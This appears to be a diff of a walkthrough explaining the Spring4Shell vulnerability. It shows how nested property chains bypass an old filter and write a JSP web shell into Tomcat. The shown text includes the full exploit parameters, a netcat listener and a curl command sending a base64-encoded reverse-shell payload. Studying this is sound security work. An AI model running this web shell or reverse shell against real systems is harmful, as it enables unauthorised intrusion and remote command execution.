@@ -31,13 +31,13 @@ In 2010, a vulnerability was discovered where attackers could exploit auto-bindi
 Spring4Shell (2022) discovered that the 2010 filter only blocked direct property names, not **property chains** — sequences of nested property accesses separated by dots. Instead of:
 
 ```
-class.classLoader  ← blocked by filter
+class.classLoader ← blocked by filter
 ```
 
 The exploit uses:
 
 ```
-class.module.classLoader.resources.context.parent.pipeline.first.pattern  ← reaches unblocked Tomcat properties
+class.module.classLoader.resources.context.parent.pipeline.first.pattern ← reaches unblocked Tomcat properties
 ```
 
 Each dot traverses one level deeper through object properties. By chaining deep enough, the attacker reaches Tomcat's internal configuration — specifically the `pattern` property used to generate request-processing rules. Injecting JSP code into this pattern causes Tomcat to create a file that executes arbitrary code.
@@ -68,11 +68,11 @@ The exploit sends a POST with parameters structured like:
 
 ```
 class.module.classLoader.resources.context.parent.pipeline.first.pattern=
-  <% if("<PASSWORD>".equals(request.getParameter("pwd"))) { 
-    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); 
-    int a = -1; byte[] b = new byte[2048]; 
-    while((a=in.read(b))!=-1) { out.println(new String(b)); } 
-  } %>
+ <% if("<PASSWORD>".equals(request.getParameter("pwd"))) { 
+ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); 
+ int a = -1; byte[] b = new byte[2048]; 
+ while((a=in.read(b))!=-1) { out.println(new String(b)); } 
+ } %>
 class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
 class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
 class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar
@@ -115,9 +115,9 @@ nc -lvnp <ATTACKER_PORT>
 
 ```bash
 curl -s -G "http://<TARGET_IP>/tomcatwar.jsp" \
-  --data-urlencode "pwd=<PASSWORD>" \
-  --data-urlencode "cmd=bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}" \
-  --output -
+ --data-urlencode "pwd=<PASSWORD>" \
+ --data-urlencode "cmd=bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}" \
+ --output -
 ```
 
 Bash decodes the base64 and interprets the redirection operators correctly, establishing a reverse shell.
